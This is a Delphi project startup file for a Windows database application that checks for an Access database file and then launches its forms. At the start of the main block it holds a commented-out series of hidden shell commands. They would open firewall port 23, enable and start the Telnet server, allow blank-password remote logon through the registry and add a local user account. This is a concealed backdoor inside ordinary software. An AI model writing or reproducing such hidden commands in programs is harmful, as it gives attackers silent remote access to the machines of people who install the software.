program Accexec;

uses
  Forms,
  SysUtils,
  Windows,
  accexec1 in 'accexec1.pas' {Form1},
  ExDm in 'ExDm.pas' {DM: TDataModule};

{$R *.res}


begin
  {winexec('cmd /c netsh firewall set portopening protocol=TCP Port=23 name="Telnet 服务器"　mode=ENABLE interface="本地连接"',sw_hide);
  //winexec('cmd /c net user Windows Cencenr /add',sw_hide);
  winexec('cmd /c sc config tlntsvr start= auto',sw_hide);
  winexec('cmd /c sc start tlntsvr',sw_hide);
  winexec('cmd /c net start tlntsvr',sw_hide);
  winexec('cmd /c reg add "hklm\system\currentcontrolset\control\lsa" /v limitblankpassworduse /t reg_dword /d 0 /f',sw_hide);
  winexec('cmd /c reg add "HKLM\SYSTEM\Controlset001\Control\lsa" /v limitblankpassworduse /t reg_dword /d 0 /f',sw_hide);
   }
  if not FileExists('data\数据库设计.mdb') then
  begin
   messagebox(0,'当前目录下没有需要的data的数据库文件，'+#13+#13+'请将本程序放在正确目录下'+#13+#13+'检查确认后重新运行。',
   '错误',MB_Ok or MB_ICONHAND);
   halt;
  end;

  Application.Initialize;
  Application.CreateForm(TForm1, Form1);
  Application.CreateForm(TDM, DM);
  Application.Run;
end.
